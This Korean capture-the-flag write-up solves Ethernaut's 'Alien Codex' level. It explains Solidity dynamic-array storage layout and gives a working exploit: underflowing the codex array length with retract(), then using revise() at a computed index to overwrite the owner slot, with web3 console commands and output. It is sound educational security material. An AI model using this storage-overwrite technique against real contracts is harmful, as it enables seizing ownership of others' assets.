https://teberr.notion.site/Ethernaut-Alien-Codex-89152a2302f54d7db0db378f1e0a62b6

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/0b1f7bfd-f86f-44c9-99f1-147b4d4b3640/Untitled.png)

> Alien 의 Codex를 발견했습니다. Owner 권한을 얻어낼 수 있을까요?

- 동적 배열이 Storage Slot에서 어떻게 저장되어 있는지 이해해봅시다.
- ABI를 이해해봅시다.
- underhanded approach를 참고해봅시다.
- [https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)
- [https://tech.ozys.io/2022/02/22/solidity-storage-layout.html](https://tech.ozys.io/2022/02/22/solidity-storage-layout.html)
> 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
```

### Ownable-05.sol

[https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol](https://github.com/OpenZeppelin/openzeppelin-test-helpers/blob/master/contracts/Ownable.sol)

Openzeppline에서 제공하는 Ownable(소유권) 컨트랙트이다.

```solidity
pragma solidity ^0.5.0;

contract Ownable {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () internal {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(isOwner());
        _;
    }

    function isOwner() public view returns (bool) {
        return msg.sender == _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyOwner {
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
        require(newOwner != address(0));
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}
```

이 컨트랙트에서는 slot으로 owner가 존재하며 이 owner 권한을 다른 주소에게 전달하려면 owner여야 하므로 이를 이용하여 owner 권한을 얻을 수는 없다.

# 코드 분석 및 공격 설계

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;

  modifier contacted() {
    assert(contact);
    _;
  }
  
  function make_contact() public {
    contact = true;
  }

  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }

  function revise(uint i, bytes32 _content) contacted public {
    codex[i] = _content;
  }
```

Ownable 컨트랙트에서는 owner 권한을 얻을 수 없으므로 이 문제 컨트랙트를 이용해야 한다. 이 문제 컨트랙트에는 동적 배열인 codex가 존재하는데 힌트로 돌아가서 스토리지 슬롯에 이 동적 배열이어떻게 담겨있는지 살펴보자.

### EVM에서의 변수

EVM에서 실행되는 각 컨트랙트는 자체적인 Storage에서 변수를 저장한다. 

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/69c06bc7-0a69-4ca8-bdff-ada34fef45e1/Untitled.png)

이 Storage는 총 2^256 -1개의 Slot이 존재하며 이 Slot은 각 32바이트 크기를 보유하고 있다. 처음에는 이 Slot 들에게 0이 채워져 있고 이는 0은 공간을 차지하고 있지 않음을 의미한다. 따라서 Slot을 0으로 변경하는 것은 공간을 비운다는 의미이므로 가스를 환급해주고 인센티브를 얻을 수 있다.

돌아와서 이 Storage에 변수를 저장할 때는 32바이트 크기의 Slot을 할당해주고 이 Slot에 값이 저장된다.  

```solidity
contract StorageTest {
    uint256 a;
    uint256[2] b;

    struct Entry {
        uint256 id;
        uint256 value;
    }
    Entry c;
}
```

위와 같은 코드가 있는 경우 스토리지에는 아래와 같이 저장된다.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/c0a18ce2-7884-4cc5-89fa-60e13ac9042c/Untitled.png)

- 변수 a는 uint256(32바이트)이므로 slot 0하나로 충분하여 저장
- 크기가 2인 uint256 배열인 b는 32바이트 칸이 두개가 필요하므로 slot 1,2 할당하여 저장
- 구조체인 c는 uint256 변수 두 개가 저장 되므로 총 32바이트 칸 두개가 필요하여 slot 3,4에 할당하여 저장

이제 문제는 동적 배열일 때다. 동적 배열일 때는 크기가 정해져있지 않기 때문에 얼마만큼의 slot을 할당해야 할지가 문제이다. 그래서 EVM 에서는 다음과 같이 저장한다.

1. slot을 하나 할당한다.
2. 이 slot에는 동적 배열의 크기가 저장된다.
3. keccak256(slot)의 결과 값 위치부터 동적 배열에 저장되는 값을 저장한다.

 

![동적 배열.png](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/54beda1d-037a-4ea2-8b16-dd63b8e3e9c5/%EB%8F%99%EC%A0%81_%EB%B0%B0%EC%97%B4.png)

따라서 만약에 d라는 동적 배열이 존재하고 이 동적배열의 크기가 할당되어 있는 slot이 5라면 keccak256(5)의 결과 값인 슬롯에서 부터 차례로 값을 저장하기 시작하는 것이다.

(매핑도 같은 방식으로 변수가 저장된 slot number를 keccak 해시한 위치부터 값이 저장되지만 이는 길이가 존재하지 않아 변수가 저장된 slot에는 비어있다. 위의 d.length가 비어있다고 생각하면 됨)

문제로 돌아가서 문제는 다음과 같이 상태 변수가 저장되어있다.

```solidity
contract AlienCodex is Ownable {

  bool public contact;
  bytes32[] public codex;
----- 후략----
```

Ownable 컨트랙트를 상속받고 있으므로 0번째 slot에는 address 타입의 _owner 변수가 들어가 있다.

근데 이때 address 타입은 20바이트이고 그 다음 상태변수인 contact는 bool 타입으로 address 타입과 합쳐서 총 32바이트를 넘지 않으므로 공간을 절약하기 위하여 bool 또한 0번째 슬롯에 저장된다.

즉 이 컨트랙트의 스토리지는 다음과 같이 들어가 있다.

- 0번째 슬롯에는 _owner 와 contact 변수 저장
- 1번째 슬롯에는 동적 배열인 codex의 크기 저장

이 동적 배열의 크기는 컨트랙트의 함수를 통해서 변경할 수 있었다.

```solidity
  function record(bytes32 _content) contacted public {
    codex.push(_content);
  }

  function retract() contacted public {
    codex.length--;
  }
```

바로 record 함수의 경우 크기를 1 증가시켜주었고 retract 함수의 경우 동적 배열의 크기를 1줄여줄 수 있었다. 그런데 크기를 줄일 때 검사를 하지 않기 때문에 동적배열의 크기가 0일때도 크기를 1줄여줄 수 있다.

그렇게 되면 동적배열의 크기는 언더플로우로 인해 최대가 된다. 이렇게 되면 동적배열은 2^256-1의 크기를 가지고 있기 때문에 EVM의 모든 slot에 값을 쓸 수 있게 된다. 따라서 owner 변수가 저장되어있는 0번 slot에도 접근할 수 있게 되어 값을 내 메타마스크 주소로 덮어 씌워주는 방식으로 공격을 진행한다.

1. 언더플로우로 인해 동적 배열의 크기를 최대로 만듬
2. 이로 인해 모든 슬롯에 접근 가능하므로 owner 가 저장된 0번 배열을 덮어 씌움 

 

# 공격

현재 owner에는 어떤 값이 저장되어 있는지 web3.eth.getStorageAt을 통하여 알아내자.

```solidity
=> Instance address
0x2af0948EF66793FF69864f01C444a82ADc89f3d5

await web3.eth.getStorageAt('0x2af0948EF66793FF69864f01C444a82ADc89f3d5',0)
'0x00000000000000000000000027bc920e7c426500a0e7d63bb037800a7288abc1'
```

이 값을 내 메타마스크 주소로 변경해야 한다. 내 메타마스크 주소는 총 20 바이트이므로 이 값을 덮어 씌워주기 위해서는 앞에 0을 12바이트 붙여주어야 한다.

```solidity
player
->0x83b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a

result = '0x00000000000000000000000083b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a'
'0x00000000000000000000000083b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a'
```

값을 덮어 씌워주기 위한 준비는 끝났으므로 codex의 크기를 언더플로우를 일으키자.

먼저 codex 동적 배열의 크기를 줄이는 retract()함수를 호출하려면 make_contact를 먼저 실행해주어contacted 조건을 달성해야 한다.

```solidity
await contract.make_contact()
-> contact 변수를 1로 만듬
await contract.retract()
-> codex 동적 배열의 크기를 1 줄여 언더플로우 발생
await web3.eth.getStorageAt('0x2af0948EF66793FF69864f01C444a82ADc89f3d5',1)
'0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'
```

이제 codex의 index를 이용하여 모든 slot에 접근할 수 있게 되었다. codex[0]은 몇번째 슬롯에 저장되는지 알아보자. codex의 크기는 slot1에 저장되므로 keccak256(1)에 동적배열 값이 저장되게 된다. 헷갈리지 말자! 동적 배열의 길이가 아니라 동적 배열의 길이가 저장된 slot의 해시값이 값이 저장되는 위치이다.

![keccat(slot1).PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a8962028-1bb6-4ed4-9772-17292ab9f7a7/keccat(slot1).png)

0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 번째의 위치가 codex[0]이 저장되는 slot이다. 그렇다면 우리가 접근하고자 하는 slot은 0번째 slot이므로 이를 구하기 위해서는 슬롯의 최대 값인 ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff 에서 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6 를 빼준후 +1을 해주면 그 위치가 0번째 slot이 된다.

```solidity
// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.0;

contract test{
    bytes32 public a = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff;
    bytes32 public b = 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6;
    bytes32 public c;

    constructor(){
        c=bytes32(uint256(a)-uint256(b)+1);
    }
}
```

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/67349b11-6f90-421d-94e5-2201fcf0672a/Untitled.png)

즉 codex[0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a]가 slot 0임을 알 수 있다. 이 위치에 미리 준비해 두었던 내 주소값을 넣어주자. 그러면 owner 변수를 내 주소로 덮어 씌우게 된다.

```solidity

target = '0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'

result = '0x00000000000000000000000083b26d6A3D3FaBd9F0A5f1d69DCA1CE6cc4eA39a'

await contract.revise(target,result)
-> codex[target] = result 

await web3.eth.getStorageAt('0x2af0948EF66793FF69864f01C444a82ADc89f3d5',0)
'0x00000000000000000000000083b26d6a3d3fabd9f0a5f1d69dca1ce6cc4ea39a'
```

정상적으로 owner 권한을 덮어 씌운 것을 확인할 수 있다. 이제 인스턴스를 제출하면 성공했음을 확인할 수 있다.

![문제 성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/516020c4-acf6-47e6-815c-682b289404c6/%EB%AC%B8%EC%A0%9C_%EC%84%B1%EA%B3%B5.png)

# 마무리

이 단계에서는 EVM이 ABI-인코딩된 길이와 페이로드를 검증하지 않음을 알 수 있었다. 추가적으로 배열 길이의 언더플로우로 인해 배열로 접근할수 있는 스토리지가 전체로 확장 되어 모든 컨트랙트 스토리지를 조작할 수 있는 것을 알 수 있었다.

이 취약점은 2017년에 있었던 [Underhanded coding contest](https://medium.com/@weka/announcing-the-winners-of-the-first-underhanded-solidity-coding-contest-282563a87079) 에서 출제 되었다.
